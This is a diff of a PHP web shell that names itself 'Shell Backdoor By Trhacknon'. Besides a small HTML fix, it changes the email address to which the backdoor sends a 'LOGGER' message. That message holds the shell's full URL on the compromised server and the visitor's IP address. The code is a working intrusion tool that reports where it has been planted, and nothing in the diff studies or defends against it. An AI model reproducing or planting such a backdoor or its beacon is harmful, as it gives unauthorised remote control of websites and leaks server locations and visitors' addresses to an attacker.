@@ -46,7 +46,7 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<h1><center><font color="red">Shell Backdoor By Trhacknon /font></center></h1>
+<h1><center><font color="red">Shell Backdoor By Trhacknon </font></center></h1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td><font color="white">Path :</font> ';
 if(isset($_GET['path'])){
@@ -291,7 +291,7 @@ return $info;
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'cyberteam4103@gmail.com';
+$tujuanmail = 'jeremydiliotti@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "akses $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
